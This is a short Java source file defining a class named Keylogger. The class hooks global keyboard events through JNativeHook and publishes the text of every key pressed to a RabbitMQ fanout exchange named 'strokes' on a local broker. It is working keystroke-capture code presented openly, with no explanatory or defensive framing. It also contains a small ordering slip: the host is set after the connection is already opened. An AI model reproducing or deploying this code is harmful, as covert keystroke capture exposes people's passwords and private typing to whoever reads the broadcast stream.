package com.mibef108287.app;

import java.io.IOException;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.rabbitmq.client.Channel;
import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;

public class Keylogger implements NativeKeyListener{
  private Channel channel; 
  private final String EXCHANGE_NAME = "strokes";

  public Keylogger() throws Exception{
    ConnectionFactory factory = new ConnectionFactory();
    Connection connection = factory.newConnection();
    factory.setHost("localhost");
    channel = connection.createChannel();
    channel.exchangeDeclare(EXCHANGE_NAME, "fanout");
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent nativeEvent){
    try {
      String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
      channel.basicPublish(EXCHANGE_NAME, "", null, key.getBytes("UTF-8"));
    } catch (IOException e) {
      System.err.println(e);
      // log this maybe
    }
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
    
  }
}
